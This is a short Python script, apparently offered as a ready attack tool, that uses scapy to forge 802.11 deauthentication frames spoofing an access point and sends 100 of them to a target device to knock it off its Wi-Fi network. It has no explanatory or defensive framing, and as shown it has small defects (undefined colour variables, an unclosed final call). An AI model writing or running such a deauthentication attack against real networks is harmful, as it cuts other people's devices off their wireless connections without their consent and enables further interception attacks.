from scapy.all import *

def deauth_attack(target_mac, ap_mac, iface):
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
    
    print(f"{RED}[ATTACK]{RESET} Sending deauthentication packets to {target_mac}")
    sendp(packet, iface=iface, count=100, inter=0.1)

deauth_attack("AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66", "wlan0"
